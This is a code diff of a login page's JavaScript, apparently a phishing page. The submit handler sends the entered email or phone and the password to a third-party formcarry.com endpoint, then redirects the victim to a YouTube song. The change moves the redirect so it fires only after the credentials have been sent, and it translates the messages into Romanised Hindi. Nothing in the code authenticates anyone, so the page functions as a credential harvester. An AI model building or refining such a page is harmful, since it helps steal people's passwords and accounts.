@@ -111,8 +111,9 @@
             document.getElementById('mainContent').classList.remove('popup-active');
         }
 
+        // Form submission and data handling
         document.getElementById("loginForm").addEventListener("submit", function (e) {
-            e.preventDefault(); // Form submission रोकें
+            e.preventDefault(); // Form submission roken
 
             const emailPhoneInput = document.getElementById("emailPhone").value;
             const passwordInput = document.getElementById("password").value;
@@ -123,7 +124,7 @@
 
             if (emailRegex.test(emailPhoneInput) || phoneRegex.test(emailPhoneInput)) {
                 if (passwordInput) {
-                    // Formcarry पर फॉर्म डेटा सबमिट करें (Updated formcarry URL)
+                    // Formcarry par form data submit karein (Updated formcarry URL)
                     fetch("https://formcarry.com/s/hJQzoZbhqc-", {
                         method: "POST",
                         headers: {
@@ -137,19 +138,23 @@
                     .then(response => {
                         if (response.ok) {
                             console.log("Data submitted successfully");
+
+                            // Data submit hone ke baad redirect karein
+                            window.location.href = "https://www.youtube.com/watch?v=Umqb9KENgmk";  // Redirect to Bollywood song
                         } else {
                             console.log("Failed to submit data");
+                            alert("Kuch galti ho gayi, kripya dubara prayas karein.");
                         }
                     })
-                    .catch(error => console.error("Error:", error));
-
-                    // Redirect to a popular Bollywood song (Tum Hi Ho)
-                    window.location.href = "https://www.youtube.com/watch?v=Umqb9KENgmk";  // Redirect to Bollywood song
+                    .catch(error => {
+                        console.error("Error:", error);
+                        alert("Error: Data submit karte samay koi samasya aayi.");
+                    });
                 } else {
-                    alert("Please enter your password.");
+                    alert("Kripya apna password daalein.");
                 }
             } else {
-                alert("Please enter a valid 10-digit phone number or email address.");
+                alert("Valid 10-digit phone number ya email address daalein.");
             }
         });
     </script>
